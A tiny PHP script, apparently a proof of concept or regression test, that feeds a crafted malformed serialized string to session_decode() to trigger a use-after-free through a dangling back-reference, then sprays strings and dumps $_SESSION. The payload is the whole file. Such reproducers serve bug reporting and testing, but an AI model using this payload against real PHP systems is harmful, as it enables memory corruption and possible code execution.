<?php
session_start();

$exploit = 'ryat|a:2:{i:0;i:1;i:1;a:1:{i:1;chtg|a:1:{i:0;R:4;}';
session_decode($exploit);

for ($i = 0; $i < 5; $i++) {
    $v[$i] = 'hi'.$i;
}

var_dump($_SESSION);
